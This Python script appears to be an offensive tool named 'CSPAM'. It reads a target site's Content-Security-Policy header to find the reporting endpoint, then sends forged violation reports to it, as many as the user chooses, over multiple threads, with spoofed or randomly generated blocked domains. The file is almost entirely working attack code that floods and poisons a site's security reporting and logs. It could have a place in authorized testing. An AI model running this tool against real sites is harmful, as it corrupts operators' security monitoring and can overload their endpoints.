import requests
import json
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import random
import string

def print_banner():
    banner = """
#############################
# AUTHOR: Joel Aviad Ossi
# COMPANY: WebSec BV
# LICENSE: CC BY-SA
# VERSION: v1.0
# WEBSITE: WWW.WEBSEC.NL
#############################
    """
    print(banner)

def get_csp_endpoint(url):
    """ Fetch headers from URL and determine CSP report endpoint. """
    try:
        response = requests.get(url)
        headers = response.headers

        # Check for CSP report-to or report-uri in the CSP header
        csp_header = headers.get('Content-Security-Policy')
        if csp_header:
            if "report-to" in csp_header:
                # Extract report-to endpoint if present
                start = csp_header.find("report-to") + len("report-to")
                end = csp_header.find(";", start)
                if end == -1:
                    end = len(csp_header)
                return csp_header[start:end].strip(), "report-to"
            elif "report-uri" in csp_header:
                # Extract report-uri endpoint if present
                start = csp_header.find("report-uri") + len("report-uri")
                end = csp_header.find(";", start)
                if end == -1:
                    end = len(csp_header)
                return csp_header[start:end].strip(), "report-uri"

        return None, None
    except requests.RequestException as e:
        print(f"Failed to retrieve headers from {url}: {e}")
        return None, None

def send_report(url, endpoint, directive, randomize_domain):
    """ Send a CSP report to the specified endpoint with optional random domain. """
    if randomize_domain:
        random_domain = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".com"
        blocked_uri = f"http://{random_domain}/spoofedpage/spoofedfile.js"
        style_src = f"style-src cdn.{random_domain}"
        original_policy = f"default-src 'none'; {style_src}; {directive} {endpoint}"
    else:
        blocked_uri = "http://spoofeddomain.com/spoofedpage/spoofedfile.js"
        style_src = "style-src cdn.spoofing.com"
        original_policy = f"default-src 'none'; {style_src}; {directive} {endpoint}"

    report_payload = {
        "csp-report": {
            "document-uri": url,
            "referrer": "CSPAM",
            "blocked-uri": blocked_uri,
            "violated-directive": style_src,
            "original-policy": original_policy,
        }
    }

    headers = {
        'Content-Type': 'application/json'
    }

    response = requests.post(endpoint, data=json.dumps(report_payload), headers=headers)
    return response.status_code, response.text

def process_requests(url, count, randomize_domain):
    endpoint, directive = get_csp_endpoint(url)

    if endpoint:
        print(f"Found {directive} directive, sending {count} report(s) to {endpoint}")
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(lambda x: send_report(url, endpoint, directive, randomize_domain), range(count)))

        for result in results:
            print("Status Code:", result[0], "Response:", result[1])
    else:
        print(f"No CSP reporting directive found in the headers of {url}.")

def main():
    print_banner()
    domain = input("What is the Target Domain (with or without 'www' or 'http'): ")
    randomize = input("Do you want to randomize the reported domain name in the CSP report? (Y/N): ").strip().lower()
    randomize_domain = randomize == 'y' or randomize == 'yes'
    count = int(input("How many test requests would you like to send? "))

    # Normalize URL
    if not domain.startswith(('http://', 'https://')):
        domain = 'http://' + domain
    domain = urlparse(domain).geturl()

    process_requests(domain, count, randomize_domain)

if __name__ == "__main__":
    main()
